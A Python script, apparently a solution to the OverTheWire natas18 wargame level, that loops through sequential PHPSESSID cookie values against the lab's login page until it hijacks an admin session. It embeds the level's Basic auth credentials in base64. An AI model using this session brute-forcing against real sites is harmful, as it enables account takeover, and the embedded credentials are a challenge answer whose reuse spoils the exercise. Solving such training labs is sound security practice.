import threading
import random
import requests
import re

headers = {
    'Authorization': 'Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA=='
}

url = 'http://natas18.natas.labs.overthewire.org/index.php?username=admin&password=3&debug'

for index in range(1, 700):
    cookies = { 'PHPSESSID': str(index) }

    request = requests.post(url, headers=headers, cookies=cookies)

    content = request.content.decode('utf-8')

    if 'You are logged in as a regular user.' not in content:
        print(content, index)
        break

    else:
        print(index, ':(')
